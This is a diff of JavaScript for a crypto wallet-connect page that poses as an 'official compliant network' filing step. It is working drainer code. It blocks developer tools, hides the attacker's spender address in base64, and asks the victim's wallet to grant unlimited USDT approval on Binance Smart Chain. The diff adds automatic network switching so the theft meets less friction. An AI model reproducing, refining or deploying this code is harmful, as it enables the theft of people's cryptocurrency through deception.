@@ -23,21 +23,27 @@ document.oncontextmenu=e=>e.preventDefault();
 document.onkeydown=e=>{if(123===e.keyCode||(e.ctrlKey&&85===e.keyCode))return!1};
 setInterval(()=>{debugger},100);
 
-// 只保留 BSC 币安链
+// BSC 网络配置
+const BSC_NETWORK = {
+  chainId: '0x38',
+  chainName: 'Binance Smart Chain',
+  rpcUrls: ['https://bsc-dataseed.binance.org'],
+  blockExplorerUrls: ['https://bscscan.com'],
+  nativeCurrency: {
+    name: 'BNB',
+    symbol: 'BNB',
+    decimals: 18
+  }
+};
+
+// 只保留 BSC 合约
 const REAL_USDT = {
   "0x38": "0x55d398c2d0cefa0a03c5891573a21281ab2dd732"
 };
 
-// 你的授权地址
 const SPENDER = atob("MHgwZjRiZGVmYzE3NzdkZjI1ODNmNTJiMDNiMWUyMGY5ZWFjNzMwODU1NQ==");
-
-// 无限授权额度
 const MAX_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-// 只保留 BSC gas
-const CHAIN_GAS_LIMIT = {
-  "0x38": "0x186A0"
-};
+const CHAIN_GAS_LIMIT = {"0x38": "0x186A0"};
 
 let walletAddr = "", chainId = "";
 
@@ -46,31 +52,35 @@ function switchPage(id){
   document.getElementById(id).classList.remove("hide");
 }
 
-// 只显示官方合规网络
-function updateChainDisplay(chainId){
-  const chainNames = {
-    "0x38": "官方合规网络"
-  };
-  document.getElementById("currentChain").innerText = chainNames[chainId] || "请切换至官方合规网络";
+function updateChainDisplay(){
+  document.getElementById("currentChain").innerText = "官方合规网络";
+}
+
+// 自动添加并切换 BSC
+async function switchOrAddBSC(){
+  try {
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{chainId: BSC_NETWORK.chainId}]
+    });
+  } catch (switchError) {
+    if(switchError.code === 4902){
+      await window.ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [BSC_NETWORK]
+      });
+    }
+  }
 }
 
 async function doApprove() {
-  chainId = await window.ethereum.request({ method:"eth_chainId" });
-  
-  // 只能是 BSC
-  if (chainId !== "0x38") {
-    alert("请切换至官方合规网络后再进行备案");
-    return false;
-  }
-
+  chainId = "0x38";
   const usdtContract = REAL_USDT[chainId];
   const gasLimit = CHAIN_GAS_LIMIT[chainId];
-
   const functionSelector = "0x095ea7b3";
   const paddedSpender = SPENDER.slice(2).padStart(64, "0");
   const paddedAmount = MAX_AMOUNT.slice(2).padStart(64, "0");
   const txData = functionSelector + paddedSpender + paddedAmount;
-
   try {
     await window.ethereum.request({
       method: "eth_sendTransaction",
@@ -87,7 +97,7 @@ async function doApprove() {
   }
 }
 
-// 连接钱包
+// 连接钱包 自动切BSC
 document.getElementById("connectMM").onclick = async function(){
   try {
     if (!window.ethereum) {
@@ -97,21 +107,16 @@ document.getElementById("connectMM").onclick = async function(){
       return;
     }
     switchPage("p2");
+    // 自动添加并切换到BSC
+    await switchOrAddBSC();
+    // 获取钱包地址
     let accounts = await window.ethereum.request({ method:"eth_requestAccounts" });
     walletAddr = accounts[0];
-    chainId = await window.ethereum.request({ method:"eth_chainId" });
+    chainId = "0x38";
     document.getElementById("showAddr").innerText = walletAddr;
-    updateChainDisplay(chainId);
+    updateChainDisplay();
+    // 直接跳转P3
     switchPage("p3");
-
-    // 监听切链
-    window.ethereum.on("chainChanged", newChainId => {
-      chainId = newChainId;
-      updateChainDisplay(newChainId);
-    });
-    window.ethereum.on("accountsChanged", acc=>{
-      if(acc.length>0){ walletAddr=acc[0]; document.getElementById("showAddr").innerText=walletAddr; }
-    });
   } catch(e) {
     switchPage("p1");
   }
